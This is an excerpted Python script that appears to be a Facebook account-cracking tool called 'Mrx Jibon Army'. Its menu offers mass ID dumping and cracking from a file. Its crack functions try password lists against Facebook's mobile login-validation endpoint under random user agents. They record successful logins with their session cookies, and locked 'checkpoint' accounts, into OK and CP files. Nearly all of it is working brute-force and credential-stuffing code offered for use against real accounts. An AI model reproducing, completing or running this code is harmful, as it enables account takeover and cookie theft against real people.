...
os.system('espeak -a 300 " Welcome,   to,  𝐌𝐫𝐱 𝐉𝐢𝐛𝐨𝐧,  Army,  Tools"')
pass
...
def menu():
    ...
    print('\033[0;97m=================')
    𝐌𝐫𝐱 𝐉𝐢𝐛𝐨𝐧 = input('\x1b[1;92m[+] CHOOSE: ')
    if 𝐌𝐫𝐱 𝐉𝐢𝐛𝐨𝐧 in ['111']:
        login()
        dump_massal()
    elif 𝐌𝐫𝐱 𝐉𝐢𝐛𝐨𝐧 in ['1']:
        crack_file()
    elif 𝐌𝐫𝐱 𝐉𝐢𝐛𝐨𝐧 in ['2', '02']:
        os.system('xdg-open https://www.facebook.com/jibon.islam65653?mibextid=ZbWKwL')
        os.system("python nono.py")
    elif 𝐌𝐫𝐱 𝐉𝐢𝐛𝐨𝐧 in ['3', '03']:
        result()
    elif 𝐌𝐫𝐱 𝐉𝐢𝐛𝐨𝐧 in ['0']:
...
def crack_file():
    ...
    print('\033[1;32m[ Put File Example:  /sdcard/𝐌𝐫𝐱 𝐉𝐢𝐛𝐨𝐧Army.txt  Etc...]')
...
def setting():
    ...
    # os.system("xdg-open https://www.facebook.com/𝐌𝐫𝐱 𝐉𝐢𝐛𝐨𝐧.Army0033")
    if hc in ['1', '01']:
...
def crack(idf, pwv):
    ...
    sys.stdout.write(
        f"\r\033[100;92m{bo}[𝐌𝐫𝐱 𝐉𝐢𝐛𝐨𝐧•M1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop / float(len(id)))}{P}]\033[0;37m "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;94m[𝐌𝐫𝐱 𝐉𝐢𝐛𝐨𝐧-Cp] {idf} • {pw}')
                ...
                print(f'\r\033[0;92m[𝐌𝐫𝐱 𝐉𝐢𝐛𝐨𝐧💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
                os.system('espeak -a 300 " 𝐌𝐫𝐱 𝐉𝐢𝐛𝐨𝐧,  Ok,  id"')
...
def crackfree(idf, pwv):
    global loop, ok, cp
    sys.stdout.write(
        f"\r{H}[𝐌𝐫𝐱 𝐉𝐢𝐛𝐨𝐧-M2]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop / float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            ...
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0', data=dataa,
                          cookies={'cookie': koki}, headers=heade, allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;95m[{time.strftime("%H:%M")}•𝐌𝐫𝐱 𝐉𝐢𝐛𝐨𝐧-Cp] {idf} • {pw}')
                os.system('espeak -a 300 " Cp,"')
                open('CP/' + cpc, 'a').write(idf + ' • ' + pw + '\n')
                akun.append(idf + ' • ' + pw)
                cp += 1
                ...
                coki = po.cookies.get_dict()
                kuki = (";").join(["%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items()])
                print(f'\r\033[10;92m[{time.strftime("%H:%M")}•𝐌𝐫𝐱 𝐉𝐢𝐛𝐨𝐧-Ok] {idf} • {pw} ')
                os.system('espeak -a 300 " Ok,  𝐌𝐫𝐱 𝐉𝐢𝐛𝐨𝐧,  id"')
                open('OK/' + okc, 'a').write(idf + ' • ' + pw + '\n')
                break
